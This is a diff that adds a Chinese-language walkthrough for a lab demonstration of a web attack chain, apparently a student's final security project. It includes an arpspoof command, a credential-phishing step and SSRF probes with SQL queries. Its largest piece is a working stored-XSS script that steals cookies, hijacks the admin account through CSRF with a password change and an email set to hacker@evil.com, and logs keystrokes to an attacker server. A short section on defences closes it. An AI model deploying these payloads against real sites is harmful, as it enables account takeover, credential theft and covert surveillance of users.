@@ -1,0 +1,235 @@
+=== 完整攻擊演示流程 ===
+
+## 環境設置 (多台虛擬機)
+
+### VM1 (Kali - 攻擊者)
+1. 啟動攻擊者伺服器
+   cd c:\Users\Alan\Desktop\coding\python\hacker_final\attacker_server
+   python app.py
+
+2. 啟動 JSshell
+   cd c:\Users\Alan\Desktop\coding\python\hacker_final\attacker_server\JSshell-master
+   python jsh.py -g
+
+3. 🎯 **新功能！動態控制面板**: http://127.0.0.1:8888/admin
+   - 即時統計數據更新
+   - 美觀的駭客風格界面
+   - 自動刷新功能 (每3秒)
+   - 快捷鍵支援 (Ctrl+Space 暫停/恢復, Ctrl+R 手動刷新)
+
+### VM2 (內部伺服器)
+1. 啟動外部 Flask
+   cd c:\Users\Alan\Desktop\coding\python\hacker_final\web_server
+   python app.py
+
+2. 啟動內部 Flask
+   cd c:\Users\Alan\Desktop\coding\python\hacker_final\internal_server
+   python app.py
+
+### VM3, VM4 (受害者 - Windows)
+- 正常訪問網站的用戶
+
+## 🚀 增強的攻擊演示流程
+
+### Step 1: 啟動動態監控
+1. 打開攻擊者控制面板: http://127.0.0.1:8888/admin
+2. 觀察即時統計：
+   - 竊取的帳密數量
+   - Keylogger 記錄數量
+   - 總按鍵數統計
+   - 伺服器狀態
+
+### Step 2: ARP Spoofing + 即時監控
+```bash
+# 在 VM1 (Kali) 執行
+arpspoof -i eth0 -t VM3_IP VM2_IP
+```
+- 控制面板會即時顯示伺服器狀態
+- 準備監控受害者連接
+
+### Step 3: 偽造登入頁面攻擊
+- VM3 訪問 http://VM2_IP:5000/login
+- 實際被導向 http://VM1_IP:8888/login
+- VM3 輸入帳密: test/testpass
+- 📊 **控制面板即時更新**：
+  - "Stolen Credentials" 計數器 +1
+  - 新的帳密記錄即時出現
+  - IP、時間戳、User Agent 詳細信息
+
+### Step 4: 使用竊取帳密登入真實伺服器
+- 在控制面板查看竊取的帳密
+- 使用 test/testpass 登入 http://VM2_IP:5000
+- 成功進入後台系統
+
+### Step 5: 🎯 **針對 Admin 的 CSRF 攻擊**
+在留言板注入專門針對admin的惡意載荷：
+```html
+<script>
+// 檢查當前用戶是否為 admin
+if(document.querySelector('.nav-content') && document.querySelector('.nav-content').innerText.includes('admin')) {
+    
+    // JSshell 反向連接 (僅針對 admin)
+    setInterval(function(){
+        with(document)body.appendChild(createElement("script")).src="http://127.0.0.1:4848/?admin_".concat(document.cookie)
+    }, 1010);
+    
+    // 針對 admin 的 CSRF 攻擊 - 修改密碼為 hacked123
+    setTimeout(() => {
+        const token = document.querySelector('input[name="csrf_token"]');
+        if(token) {
+            fetch('/account', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'csrf_token=' + token.value + '&new_password=hacked123&email=hacker@evil.com'
+            }).then(() => {
+                console.log('[ATTACK] Admin password changed to hacked123');
+            });
+        }
+    }, 2000);
+    
+    // 針對 admin 的 Keylogger
+    let adminKeys='';
+    document.addEventListener('keydown',e=>{
+        adminKeys+=e.key;
+        if(adminKeys.length>=5){
+            new Image().src='http://127.0.0.1:8888/keylogger?admin_keys='+encodeURIComponent(adminKeys);
+            adminKeys='';
+        }
+    });
+    
+} else {
+    // 針對普通用戶的 Keylogger (較簡單)
+    let keys='';
+    document.addEventListener('keydown',e=>{
+        keys+=e.key;
+        if(keys.length>=8){
+            new Image().src='http://127.0.0.1:8888/keylogger?keys='+encodeURIComponent(keys);
+            keys='';
+        }
+    });
+}
+</script>
+```
+
+### Step 6: 等待 Admin 觸發攻擊
+- Admin 登入系統: admin/adminpass
+- 訪問留言板查看留言
+- 🎯 **自動觸發 CSRF 攻擊**：
+  - Admin 密碼自動修改為 hacked123
+  - Admin 郵箱修改為 hacker@evil.com
+  - Admin 的 JSshell 連接建立
+  - Admin 的按鍵開始被記錄
+
+### Step 7: 驗證攻擊成功
+1. Admin 登出
+2. 嘗試用原密碼登入: admin/adminpass ❌ 失敗
+3. 使用新密碼登入: admin/hacked123 ✅ 成功
+4. 攻擊者成功獲得 Admin 權限！
+
+### Step 8: JSshell 控制 Admin
+在 VM1 的 JSshell terminal：
+```javascript
+// 測試 Admin 連接
+alert('Admin 瀏覽器已被控制!')
+
+// 獲取 Admin 的所有 Cookie
+prompt('Admin Cookies:', document.cookie)
+
+// 重定向 Admin 到攻擊者控制面板
+document.location = 'http://127.0.0.1:8888/admin'
+
+// 在 Admin 瀏覽器中執行管理員操作
+fetch('/admin/users').then(r=>r.text()).then(data=>console.log(data))
+```
+
+### Step 9: 🎯 **SSRF 攻擊演示**
+1. **發現 SSRF 端點**
+   ```
+   訪問: http://127.0.0.1:5000/fetch
+   發現可以獲取任意 URL 內容
+   ```
+
+2. **探測內部服務**
+   ```
+   http://127.0.0.1:5000/fetch?path=http://127.0.0.1:8080/
+   發現內部管理系統運行在 8080 端口
+   ```
+
+3. **竊取敏感資料**
+   ```
+   員工資料: /fetch?path=http://127.0.0.1:8080/employees
+   財務資料: /fetch?path=http://127.0.0.1:8080/financial  
+   系統日誌: /fetch?path=http://127.0.0.1:8080/logs
+   ```
+
+4. **SQL Injection via SSRF**
+   ```
+   /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT * FROM employees WHERE salary > 1000000
+   /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT * FROM financial_data WHERE amount > 10000000
+   ```
+
+### Step 10: 🛡️ **CSRF 保護測試**
+1. **正常流程 (有 CSRF token)**
+   - 登入後訪問 /account
+   - 使用正確的 CSRF token 修改資料
+   - ✅ 修改成功
+
+2. **CSRF 攻擊測試 (無 CSRF token)**
+   - 嘗試直接 POST 到 /account 而不帶 CSRF token
+   - ❌ 攻擊被阻擋："CSRF token 驗證失敗"
+
+3. **XSS + CSRF 繞過攻擊**
+   ```html
+   <script>
+   // 獲取頁面中的 CSRF token
+   const token = document.querySelector('input[name="csrf_token"]').value;
+   
+   // 使用正確的 CSRF token 進行攻擊
+   fetch('/account', {
+       method: 'POST',
+       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+       body: `csrf_token=${token}&new_password=hacked123&email=attacker@evil.com`
+   });
+   </script>
+   ```
+
+## 🎯 完整攻擊鏈演示
+
+### 攻擊階段 1: 資訊收集
+- ✅ **ARP Spoofing**: 攔截網路流量
+- ✅ **釣魚攻擊**: 竊取初始帳密
+- ✅ **SSRF 探測**: 發現內部服務
+
+### 攻擊階段 2: 權限提升  
+- ✅ **Stored XSS**: 植入惡意載荷
+- ✅ **CSRF 繞過**: 修改 admin 密碼
+- ✅ **JSshell**: 控制 admin 瀏覽器
+
+### 攻擊階段 3: 資料竊取
+- ✅ **內部服務訪問**: 透過 SSRF 訪問機敏系統
+- ✅ **員工資料**: 薪資、職位、聯絡方式
+- ✅ **財務資料**: 交易記錄、帳戶資訊
+- ✅ **系統日誌**: 安全事件、訪問記錄
+
+### 攻擊階段 4: 持久化控制
+- ✅ **管理員權限**: 完全控制 Web 應用
+- ✅ **瀏覽器控制**: JSshell 遠端操作
+- ✅ **按鍵記錄**: 持續監控用戶輸入
+- ✅ **資料庫訪問**: 查看和修改所有資料
+
+## 🔒 防護機制展示
+
+### CSRF 保護
+- ✅ 每個表單都有唯一的 CSRF token
+- ✅ 無效或缺失的 token 會被拒絕
+- ❌ XSS 攻擊可以繞過 CSRF 保護
+
+### 內部服務隔離
+- ✅ 內部服務只接受來自 127.0.0.1 的請求
+- ❌ SSRF 攻擊可以繞過 IP 限制
+
+### 輸入驗證
+- ❌ 留言板允許未過濾的 HTML 輸入
+- ❌ SSRF 端點允許訪問任意 URL
+
+這個完整的演示展示了現代 Web 應用中多種漏洞的組合攻擊！
